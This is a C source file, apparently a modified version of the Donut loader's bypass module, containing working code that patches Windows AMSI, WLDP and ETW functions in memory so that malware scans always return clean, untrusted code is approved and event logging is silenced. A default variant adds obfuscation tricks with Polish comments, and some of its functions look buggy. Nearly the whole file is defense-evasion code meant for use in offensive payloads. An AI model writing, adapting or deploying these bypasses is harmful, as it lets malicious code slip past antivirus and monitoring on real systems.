/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "bypass.h"
#define BYPASS_AMSI_E

#if defined(BYPASS_AMSI_NONE)
BOOL DisableAMSI(PDONUT_INSTANCE inst) {
  return TRUE;
}

#elif defined(BYPASS_AMSI_E)
#define NtCurrentPeb()            (NtCurrentTeb()->ProcessEnvironmentBlock)
BOOL UnicodeStringToAnsiString(UNICODE_STRING* unicodeStr, char** ansiStr, PDONUT_INSTANCE inst) {
    int bufferSize = inst->api.WideCharToMultiByte(CP_UTF8, 0, unicodeStr->Buffer, unicodeStr->Length / 2, NULL, 0, NULL, NULL);
    if (bufferSize == 0) {
        return FALSE;
    }
    *ansiStr = inst->api.VirtualAlloc(NULL, bufferSize + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (*ansiStr == NULL) {
        return STATUS_NO_MEMORY;
    }

    int result = inst->api.WideCharToMultiByte(CP_UTF8, 0, unicodeStr->Buffer, unicodeStr->Length / 2, *ansiStr, bufferSize, NULL, NULL);
    if (result == 0) {
        inst->api.VirtualFree(*ansiStr, bufferSize + 1, MEM_RELEASE | MEM_DECOMMIT);
        return FALSE;
    }

    (*ansiStr)[bufferSize] = '\0';
    
    return FALSE;
}

int CompareDllPrefix(const char* str1, const char* str2) {
    while (*str1 != '\0' && *str2 != '\0') {
        if (*str1 == '.' && *(str1+1) == 'd' && *(str1+2) == 'l' && *(str1+3) == 'l') {
            return 0;
        }
        if (*str2 == '.' && *(str2+1) == 'd' && *(str2+2) == 'l' && *(str2+3) == 'l') {
            return 0;
        }
        if (*str1 != *str2) {
            return 0;
        }
        str1++;
        str2++;
    }
    return 1;
}


HMODULE FindModule(const char* moduleName, PDONUT_INSTANCE inst) {
    // Get PEB address using NtCurrentPeb
    PPEB peb = NtCurrentPeb();
    PEB_LDR_DATA* ldrData = peb->Ldr;
    LIST_ENTRY* head = &ldrData->InLoadOrderModuleList;
    LIST_ENTRY* current = head->Flink;

    // Iterate over the linked list of loaded modules
    while (current != head) {
        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        char* ansiStr;
        UnicodeStringToAnsiString(&entry->BaseDllName, &ansiStr, inst);
        int eq = CompareDllPrefix(ansiStr, moduleName);
        if (entry && CompareDllPrefix(ansiStr, moduleName)) {
          DPRINT("Found Amsi.dll at: %p", entry->DllBase);
          return (HMODULE)entry->DllBase;
        }
        current = current->Flink;
    }
    return NULL;
}

void* FindExportTable(HMODULE hModule) {
    // Uzyskaj nagłówek DOS
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    
    // Sprawdzenie, czy nagłówek DOS jest poprawny
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return;
    }

    // Przejdź do nagłówka NT
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    
    // Sprawdzenie, czy nagłówek NT jest poprawny
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return;
    }

    // Znajdź adres tabeli eksportów
    DWORD exportTableRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportTableRVA == 0) {
        return;
    }

    // Oblicz adres tabeli eksportów w pamięci
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportTableRVA);
    return exportDir;
}

HRESULT WINAPI AmsiScanBufferStub(
    HAMSICONTEXT amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT  *result)
{    
    *result = AMSI_RESULT_CLEAN;
    volatile int noop = 0xC50505;
    for (int j = 0; j < 1000; j++) {
        noop += j;  // Zmienia wartość zmiennej, ale nie wpływa na funkcjonalność
    }
    return S_OK;
}

int AmsiScanBufferStubEnd(int a, int b) {
  if(a==b) {
      int c = 0;
      c++;
    }
  return 0;
}

// Implementacja prostego algorytmu LCG
int my_rand(unsigned int seed) {
    unsigned long rand_state = seed;
    // Parametry algorytmu LCG
    unsigned long a = 1664525;   // Stała mnożenia
    unsigned long c = 1013904223; // Stała dodawania
    unsigned long m = 4294967296; // Moduł (2^32)
    
    // Zaktualizowanie stanu generatora
    rand_state = (a * rand_state + c) % m;
    
    // Zwrócenie wartości pseudolosowej
    return rand_state & 0x7FFFFFFF; // Ograniczamy do 32-bitowej liczby (od 0 do RAND_MAX)
}

void swap(void *a, void *b, size_t size) {
    unsigned char *pa = (unsigned char *)a;
    unsigned char *pb = (unsigned char *)b;
    for (size_t i = 0; i < size; i++) {
        unsigned char tmp = pa[i];
        pa[i] = pb[i];
        pb[i] = tmp;
    }
}

// intptr_t replaceReturnWithJump(PDONUT_INSTANCE inst, void* function, size_t functionSize, void* jumpTarget) {
//     DWORD oldProtect;
//     BYTE* funcBytes = (BYTE*)function;
//     BYTE* target = (BYTE*)jumpTarget;
//     DPRINT("PTR replaceReturnWithJump 0x%p\n", replaceReturnWithJump);
//     // Odblokowanie pamięci na zapis
//     // 48 B8 49 92 24 49 FF FF FF 00
//     // FF E0
//     if (inst->api.VirtualProtect(function, functionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
//         // Przeszukiwanie kodu funkcji w poszukiwaniu instrukcji `ret` (0xC3)
//         for (size_t i = 0; i < functionSize; i++) {
//             if (funcBytes[i] == 0x05 && funcBytes[i+1] == 0x05 && funcBytes[i+2] == 0xC5) {
//                 i = i - 4; // Znaleziono `ret`
//                 DPRINT("Found '0xC50505' at offset 0x%zx\n", i);
//                 DPRINT("Found '0xC50505' at 0x%p\n", &funcBytes[i]);

//                 // Obliczanie relatywnego offsetu dla skoku
//                 intptr_t offset = target - (funcBytes + i + 5); // +5 = rozmiar instrukcji `jmp`
//                 DPRINT("Offset to ret 0x%x\n", offset);
//                 funcBytes[i] = 0xE9; // `jmp` opcode
//                 *(int32_t*)(funcBytes + i + 1) = (int32_t)offset; // Wstawienie relatywnego offsetu
//                 DPRINT("Replaced 'ret' with 'jmp' to 0x%x\n", funcBytes + i + 5 + offset);
//                 DPRINT("Offset value: %x\n", ((unsigned char*)funcBytes)[i + 5 + offset]);
//                 DPRINT("Offset value: %x\n", *(funcBytes + i + 5 + offset));
//                 inst->api.VirtualProtect(function, functionSize, oldProtect, &oldProtect);
//                 inst->api.FlushInstructionCache(GetCurrentProcess(), function, functionSize);
//                 return funcBytes + i + 5;
//             }
//         }

//         // Przywrócenie ochrony pamięci
        
//     }
//     else {
//         printf("Failed to change memory protection.\n");
//     }
// }

intptr_t replaceReturnWithJump(PDONUT_INSTANCE inst, void* function, size_t functionSize, void* jumpTarget) {
    HMODULE dll;
    LPVOID  cs;

    // try load amsi. if unable, assume DLL doesn't exist
    // and return TRUE to indicate it's okay to continue
    dll = xGetLibAddress(inst, inst->amsi);
    if(dll == NULL) return TRUE;
    
    // resolve address of AmsiScanBuffer. if not found,
    // return FALSE because it should exist ...
    cs = xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
    functionSize = 32;
    DWORD oldProtect;
    BYTE* funcBytes = (BYTE*)cs;
    BYTE* target = (BYTE*)jumpTarget;
    DPRINT("PTR replaceReturnWithJump 0x%p\n", replaceReturnWithJump);
    // Odblokowanie pamięci na zapis
    // 48 B8 49 92 24 49 FF FF FF 00
    // FF E0
    if (inst->api.VirtualProtect(funcBytes, functionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        // Przeszukiwanie kodu funkcji w poszukiwaniu instrukcji `ret` (0xC3)
        // for (size_t i = 0; i < functionSize; i++) {
        //     if (funcBytes[i] == 0x05 && funcBytes[i+1] == 0x05 && funcBytes[i+2] == 0xC5) {
        //         i = i - 4; // Znaleziono `ret`
        //         DPRINT("Found '0xC50505' at offset 0x%zx\n", i);
        //         DPRINT("Found '0xC50505' at 0x%p\n", &funcBytes[i]);

        //         // Obliczanie relatywnego offsetu dla skoku
        //         funcBytes[i] = 0x48;
        //         funcBytes[i+1] = 0xB8;
        //         *(int64_t*)(funcBytes + i + 2) = (int64_t)jumpTarget; // Wstawienie relatywnego offsetu
        //         DPRINT("Replaced 'ret' with 'jmp' to 0x%x\n", jumpTarget);
        //         DPRINT("Offset value: %x\n", *(char*)jumpTarget);
        //         funcBytes[i+10] = 0xFF;
        //         funcBytes[i+11] = 0xE0;
        //         inst->api.VirtualProtect(funcBytes, functionSize, oldProtect, &oldProtect);
        //         inst->api.FlushInstructionCache(GetCurrentProcess(), funcBytes, functionSize);
        //         return funcBytes + i + 5;
        //     }
        // }
        int i = 0;
        funcBytes[i] = 0x48;
        funcBytes[i+1] = 0xB8;
        *(int64_t*)(funcBytes + i + 2) = (int64_t)function; // Wstawienie relatywnego offsetu
        DPRINT("Replaced 'ret' with 'jmp' to 0x%x\n", function);
        DPRINT("Offset value: %x\n", *(char*)function);
        funcBytes[i+10] = 0xFF;
        funcBytes[i+11] = 0xE0;
        inst->api.VirtualProtect(funcBytes, functionSize, oldProtect, &oldProtect);
        inst->api.FlushInstructionCache(inst->api.GetCurrentProcess(), funcBytes, functionSize);
        return funcBytes + i + 5;

        // Przywrócenie ochrony pamięci
        
    }
    else {
        DPRINT("Failed to change memory protection.");
    }
}


// Funkcja do kopiowania integer z jednego obszaru do drugiego w zakamuflowany sposób
void obscure_copy(PDONUT_INSTANCE inst, void** src, void** dst, size_t len) {
    // Zastosowanie tablicy wskaźników pomocniczych traktowanych jako char*
    char** helper_array = (char**)inst->api.VirtualAlloc(NULL, len * sizeof(char*), MEM_COMMIT, PAGE_READWRITE);
    if (helper_array == NULL) {
        return;
    }

    // Inicjalizacja wskaźników pomocniczych jako char*
    for (size_t i = 0; i < len; i++) {
        helper_array[i] = (char*)src[i]; // Kopiowanie wskaźników funkcji jako char*
    }

    // Wstawienie wskaźników do "zakamuflowanego" miejsca docelowego
    for (size_t i = 0; i < len; i++) {
        DPRINT("Size %d", len)
        // Kopiowanie wskaźników do losowo wybranego "miejsca docelowego"
        swap(&dst[i], &helper_array[my_rand(12345) % len], sizeof(char*));
    }

    // Zwalniamy pamięć
    inst->api.VirtualFree(helper_array, 0, MEM_RELEASE);
}

intptr_t replace_stub(PDONUT_INSTANCE inst) {
  DWORD len = (ULONG_PTR)AmsiScanBufferStubEnd -
  (ULONG_PTR)AmsiScanBufferStub;
  void* jumpTarget = NULL;
  BYTE* funcBytes = (BYTE*)xGetProcAddress(inst, xGetLibAddress(inst, inst->amsi), inst->amsiScanStr, 0);
  for (size_t i = 0; i < 120; i++) {

      if (funcBytes[i] == 0xC3) { // Znaleziono `ret`
          DPRINT("Found 'ret' at offset 0x%zx", i);
          jumpTarget = &funcBytes[i];
          DPRINT("Found 'ret' at 0x%p\n", jumpTarget);
          break;
      }
  }
  return replaceReturnWithJump(inst, (void*)AmsiScanBufferStub, len, jumpTarget);
}


BOOL DisableAMSI(PDONUT_INSTANCE inst) {
  xGetLibAddress(inst, inst->amsi);

  // HMODULE dll;
  // DWORD   len, op, t;
  // LPVOID  cs;

  // // try load amsi. if unable, assume DLL doesn't exist
  // // and return TRUE to indicate it's okay to continue
  // dll = xGetLibAddress(inst, inst->kernelbase);
  // if(dll == NULL) return TRUE;
  
  // // resolve address of AmsiScanBuffer. if not found,
  // // return FALSE because it should exist ...
  // cs = xGetProcAddress(inst, dll, "DebugBreak", 0);
  
  // ((void(*)(void))cs)();

  HMODULE amsiDll = FindModule(inst->amsi, inst);  // Find the AMSI library
  if (amsiDll == NULL) {
      return FALSE;
  }
  PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)FindExportTable(amsiDll);
  if (!exportDir) {
    return FALSE;
  }

  DWORD* pFunctionAddresses = (DWORD*)((BYTE*)amsiDll + exportDir->AddressOfFunctions);
  DWORD* pFunctionNames = (DWORD*)((BYTE*)amsiDll + exportDir->AddressOfNames);
  WORD* pNameOrdinals = (WORD*)((BYTE*)amsiDll + exportDir->AddressOfNameOrdinals);

  for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
    char* funcName = (char*)((BYTE*)amsiDll + pFunctionNames[i]);
    if (compare(funcName, inst->amsiScanBuf)) {
        // Znaleziono nazwę funkcji, zwróć jej adres
        DWORD functionRVA = pFunctionAddresses[pNameOrdinals[i]];
        void* functionAddr = (void*)((BYTE*)amsiDll + functionRVA);
        DPRINT("Fuzzing AmsiScanBuffer at: %p", functionAddr);
        DWORD len = (ULONG_PTR)AmsiScanBufferStubEnd -
        (ULONG_PTR)AmsiScanBufferStub;
        DWORD op = 0;
        DWORD t = 0;
        DPRINT("%d", len)
        //fprintf(stderr, "\n");
        int i = 0;
        while (i < len)
        {
            //fprintf(stderr, "%02X",((unsigned char*)AmsiScanBufferStub)[i]);
            i++;
        }
        //fprintf(stderr, "\n");
        if(!inst->api.VirtualProtect(
          functionAddr, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE; 
        DPRINT("Overwriting AmsiScanBuffer");
        // over write with virtual address of stub
        intptr_t ptr = replace_stub(inst);
        // DWORD new_len = (ULONG_PTR)ptr -
        // (ULONG_PTR)AmsiScanBufferStub;
        // fprintf(stderr, "\n");
        // i = 0;
        // while (i < new_len)
        // {
        //     fprintf(stderr, "%02X",((unsigned char*)AmsiScanBufferStub)[i]);
        //     i++;
        // }
        //fprintf(stderr, "\n");
        DPRINT("AmsiScanBufferStub at: %p", AmsiScanBufferStub);
        DPRINT("AmsiScanBufferStubEnd at: %p", AmsiScanBufferStubEnd);
        //Memcpy(functionAddr, ADR(PCHAR, AmsiScanBufferStub), len);
        // set memory back to original protection
        inst->api.VirtualProtect(functionAddr, len, op, &t);
        return TRUE;
    }
  }
  
  DPRINT("Function not found.");
  return FALSE;
}

#elif defined(BYPASS_AMSI_A)
BOOL DisableAMSI(PDONUT_INSTANCE inst) {
  return TRUE;
}

#elif defined(BYPASS_AMSI_B)
// fake function that always returns S_OK and AMSI_RESULT_CLEAN
HRESULT WINAPI AmsiScanBufferStub(
    HAMSICONTEXT amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT  *result)
{    
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

// This function is never called. It's simply used to calculate
// the length of AmsiScanBufferStub above.
//
// The reason it performs a multiplication is because MSVC can identify
// functions that perform the same operation and eliminate them
// from the compiled code. Null subroutines are eliminated, so the body of
// function needs to do something.

int AmsiScanBufferStubEnd(int a, int b) {
    return a * b;
}

// fake function that always returns S_OK and AMSI_RESULT_CLEAN
HRESULT WINAPI AmsiScanStringStub(
    HAMSICONTEXT amsiContext,
    LPCWSTR      string,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT  *result)
{
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

int AmsiScanStringStubEnd(int a, int b) {
    return a + b;
}

BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    HMODULE dll;
    DWORD   len, op, t;
    LPVOID  cs;

    // try load amsi. if unable, assume DLL doesn't exist
    // and return TRUE to indicate it's okay to continue
    dll = xGetLibAddress(inst, inst->amsi);
    if(dll == NULL) return TRUE;
    
    // resolve address of AmsiScanBuffer. if not found,
    // return FALSE because it should exist ...
    cs = xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
    if(cs == NULL) return FALSE;
    
    // calculate length of stub
    len = (ULONG_PTR)AmsiScanBufferStubEnd -
          (ULONG_PTR)AmsiScanBufferStub;
    
    DPRINT("Length of AmsiScanBufferStub is %" PRIi32 " bytes.", len);
    
    // check for negative length. this would only happen when
    // compiler decides to re-order functions.
    if((int)len < 0) return FALSE;
    
    // make the memory writeable. return FALSE on error
    if(!inst->api.VirtualProtect(
      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
      
    DPRINT("Overwriting AmsiScanBuffer");
    // over write with virtual address of stub
    Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);   
    // set memory back to original protection
    inst->api.VirtualProtect(cs, len, op, &t);
  
    // resolve address of AmsiScanString. if not found,
    // return FALSE because it should exist ...
    cs = xGetProcAddress(inst, dll, inst->amsiScanStr, 0);
    if(cs == NULL) return FALSE;
    
    // calculate length of stub
    len = (ULONG_PTR)AmsiScanStringStubEnd -
          (ULONG_PTR)AmsiScanStringStub;
     
    DPRINT("Length of AmsiScanStringStub is %" PRIi32 " bytes.", len);
    
    // check for negative length. this would only happen when
    // compiler decides to re-order functions.
    if((int)len < 0) return FALSE;
    
    // make the memory writeable
    if(!inst->api.VirtualProtect(
      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
      
    DPRINT("Overwriting AmsiScanString");
    // over write with virtual address of stub
    Memcpy(cs, ADR(PCHAR, AmsiScanStringStub), len);   
    // set memory back to original protection
    inst->api.VirtualProtect(cs, len, op, &t);
    
    return TRUE;
}

#elif defined(BYPASS_AMSI_C)
BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    HMODULE        dll;
    PBYTE          cs;
    DWORD          i, op, t;
    BOOL           disabled = FALSE;
    PDWORD         Signature;
    
    // try load amsi. if unable to load, assume
    // it doesn't exist and return TRUE to indicate
    // it's okay to continue.
    dll = xGetLibAddress(inst, inst->amsi);
    if(dll == NULL) return TRUE;
    
    // resolve address of AmsiScanBuffer. if unable, return
    // FALSE because it should exist.
    cs = (PBYTE)xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
    if(cs == NULL) return FALSE;
    
    // scan for signature
    for(i=0;;i++) {
      Signature = (PDWORD)&cs[i];
      // is it "AMSI"?
      if(*Signature == *(PDWORD)inst->amsi) {
        // set memory protection for write access
        inst->api.VirtualProtect(cs, sizeof(DWORD), 
          PAGE_EXECUTE_READWRITE, &op);
          
        // change signature
        *Signature++;
        
        // set memory back to original protection
        inst->api.VirtualProtect(cs, sizeof(DWORD), op, &t);
        disabled = TRUE;
        break;
      }
    }
    return disabled;
}

#elif defined(BYPASS_AMSI_D)
// Attempt to find AMSI context in .data section of CLR.dll
// Could also scan PEB.ProcessHeap for this..
// Disabling AMSI via AMSI context is based on idea by Matt Graeber
// https://gist.github.com/mattifestation/ef0132ba4ae3cc136914da32a88106b9

BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    LPVOID                   clr;
    BOOL                     disabled = FALSE;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, j, res;
    PBYTE                    ds;
    MEMORY_BASIC_INFORMATION mbi;
    _PHAMSICONTEXT           ctx;
    
    // get address of CLR.dll. if unable, this
    // probably isn't a dotnet assembly being loaded
    clr = inst->api.GetModuleHandleA(inst->clr);
    if(clr == NULL) return FALSE;
    
    dos = (PIMAGE_DOS_HEADER)clr;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, clr, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
      nt->FileHeader.SizeOfOptionalHeader);
             
    // scan all writeable segments while disabled == FALSE
    for(i = 0; 
        i < nt->FileHeader.NumberOfSections && !disabled; 
        i++) 
    {
      // if this section is writeable, assume it's data
      if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
        // scan section for pointers to the heap
        ds = RVA2VA (PBYTE, clr, sh[i].VirtualAddress);
           
        for(j = 0; 
            j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
            j += sizeof(ULONG_PTR)) 
        {
          // get pointer
          ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
          // query if the pointer
          res = inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
          if(res != sizeof(mbi)) continue;
          
          // if it's a pointer to heap or stack
          if ((mbi.State   == MEM_COMMIT    ) &&
              (mbi.Type    == MEM_PRIVATE   ) && 
              (mbi.Protect == PAGE_READWRITE))
          {
            ctx = (_PHAMSICONTEXT)ptr;
            // check if it contains the signature 
            if(ctx->Signature == *(PDWORD*)inst->amsi) {
              // corrupt it
              ctx->Signature++;
              disabled = TRUE;
              break;
            }
          }
        }
      }
    }
    return disabled;
}
#endif

#if defined(BYPASS_WLDP_A)
// This is where you may define your own WLDP bypass.
// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_WLDP_A defined.

BOOL DisableWLDP(PDONUT_INSTANCE inst) {
    return TRUE;
}

#elif defined(BYPASS_WLDP_B)

// fake function that always returns S_OK and isApproved = TRUE
HRESULT WINAPI WldpIsClassInApprovedListStub(
    REFCLSID               classID,
    PWLDP_HOST_INFORMATION hostInformation,
    PBOOL                  isApproved,
    DWORD                  optionalFlags)
{
    *isApproved = TRUE;
    return S_OK;
}

// make sure prototype and code are different from other subroutines
// to avoid removal by MSVC
int WldpIsClassInApprovedListStubEnd(int a, int b) {
  return a - b;
}

// fake function that always returns S_OK
HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
    HANDLE fileHandle,
    PVOID  baseImage,
    ULONG  ImageSize)
{
    return S_OK;
}

int WldpQueryDynamicCodeTrustStubEnd(int a, int b) {
  return a / b;
}

BOOL DisableWLDP(PDONUT_INSTANCE inst) {
    HMODULE wldp;
    DWORD   len, op, t;
    LPVOID  cs;
    
    // try load wldp. if unable, assume DLL doesn't exist
    // and return TRUE to indicate it's okay to continue
    wldp = xGetLibAddress(inst, inst->wldp);
    if(wldp == NULL) return TRUE;
    
    // resolve address of WldpQueryDynamicCodeTrust
    // if not found, return FALSE because it should exist
    cs = xGetProcAddress(inst, wldp, inst->wldpQuery, 0);
    if(cs == NULL) return FALSE;
    
    // calculate length of stub
    len = (ULONG_PTR)WldpQueryDynamicCodeTrustStubEnd -
          (ULONG_PTR)WldpQueryDynamicCodeTrustStub;
      
    DPRINT("Length of WldpQueryDynamicCodeTrustStub is %" PRIi32 " bytes.", len);
    
    // check for negative length. this would only happen when
    // compiler decides to re-order functions.
    if((int)len < 0) return FALSE;
    
    // make the memory writeable. return FALSE on error
    if(!inst->api.VirtualProtect(
      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
      
    // overwrite with virtual address of stub
    Memcpy(cs, ADR(PCHAR, WldpQueryDynamicCodeTrustStub), len);
    // set back to original protection
    inst->api.VirtualProtect(cs, len, op, &t);
    
    // resolve address of WldpIsClassInApprovedList
    // if not found, return FALSE because it should exist
    cs = xGetProcAddress(inst, wldp, inst->wldpIsApproved, 0);
    if(cs == NULL) return FALSE;
    
    // calculate length of stub
    len = (ULONG_PTR)WldpIsClassInApprovedListStubEnd -
          (ULONG_PTR)WldpIsClassInApprovedListStub;
    
    DPRINT("Length of WldpIsClassInApprovedListStub is %" PRIi32 " bytes.", len);
    
    // check for negative length. this would only happen when
    // compiler decides to re-order functions.
    if((int)len < 0) return FALSE;
    
    // make the memory writeable. return FALSE on error
    if(!inst->api.VirtualProtect(
      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
      
    // overwrite with virtual address of stub
    Memcpy(cs, ADR(PCHAR, WldpIsClassInApprovedListStub), len);
    // set back to original protection
    inst->api.VirtualProtect(cs, len, op, &t);
    
    return TRUE;
}
#endif

#if defined(BYPASS_ETW_NONE)
BOOL DisableETW(PDONUT_INSTANCE inst) {
  return TRUE;
}

#elif defined(BYPASS_ETW_A)
// This is where you may define your own ETW bypass.
// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_ETW_A defined.
BOOL DisableETW(PDONUT_INSTANCE inst) {
  HMODULE ntdll = FindModule(inst->ntdll, inst);  // Find the AMSI library
  if (ntdll == NULL) {
      return FALSE;
  }
  PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)FindExportTable(ntdll);
  if (!exportDir) {
    return FALSE;
  }

  DWORD* pFunctionAddresses = (DWORD*)((BYTE*)ntdll + exportDir->AddressOfFunctions);
  DWORD* pFunctionNames = (DWORD*)((BYTE*)ntdll + exportDir->AddressOfNames);
  WORD* pNameOrdinals = (WORD*)((BYTE*)ntdll + exportDir->AddressOfNameOrdinals);

  for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
    char* funcName = (char*)((BYTE*)ntdll + pFunctionNames[i]);
    if (compare(funcName, inst->etwEventWrite)) {
        DWORD functionRVA = pFunctionAddresses[pNameOrdinals[i]];
        void* functionAddr = (void*)((BYTE*)ntdll + functionRVA);
        DPRINT("Fuzzing etwEventWrite at: %p", functionAddr);
        DWORD op = 0;
        DWORD t = 0;

        #ifdef _WIN64
            // make the memory writeable. return FALSE on error
            if (!inst->api.VirtualProtect(
                functionAddr, 1, PAGE_EXECUTE_READWRITE, &op)) return FALSE;

            DPRINT("Overwriting EtwEventWrite");

            // over write with "ret"
            Memcpy(functionAddr, inst->etwRet64, 1);

            // set memory back to original protection
            inst->api.VirtualProtect(functionAddr, 1, op, &t);
        #else
            // make the memory writeable. return FALSE on error
            if (!inst->api.VirtualProtect(
                functionAddr, 4, PAGE_EXECUTE_READWRITE, &op)) return FALSE;

            DPRINT("Overwriting EtwEventWrite");

            // over write with "ret 14h"
            Memcpy(functionAddr, inst->etwRet32, 4);

            // set memory back to original protection
            inst->api.VirtualProtect(functionAddr, 4, op, &t);
        #endif
        return TRUE;
    }
  }
  
  DPRINT("Function not found.");
  return FALSE;
}

#elif defined(BYPASS_ETW_B)
BOOL DisableETW(PDONUT_INSTANCE inst) {
    HMODULE dll;
    DWORD   len, op, t;
    LPVOID  cs;

    // get a handle to ntdll.dll
    dll = xGetLibAddress(inst, inst->ntdll);

    // resolve address of EtwEventWrite
    // if not found, return FALSE because it should exist
    cs = xGetProcAddress(inst, dll, inst->etwEventWrite, 0);
    if (cs == NULL) return FALSE;

#ifdef _WIN64
    // make the memory writeable. return FALSE on error
    if (!inst->api.VirtualProtect(
        cs, 1, PAGE_EXECUTE_READWRITE, &op)) return FALSE;

    DPRINT("Overwriting EtwEventWrite");

    // over write with "ret"
    Memcpy(cs, inst->etwRet64, 1);

    // set memory back to original protection
    inst->api.VirtualProtect(cs, 1, op, &t);
#else
    // make the memory writeable. return FALSE on error
    if (!inst->api.VirtualProtect(
        cs, 4, PAGE_EXECUTE_READWRITE, &op)) return FALSE;

    DPRINT("Overwriting EtwEventWrite");

    // over write with "ret 14h"
    Memcpy(cs, inst->etwRet32, 4);

    // set memory back to original protection
    inst->api.VirtualProtect(cs, 4, op, &t);
#endif

    return TRUE;

}

#endif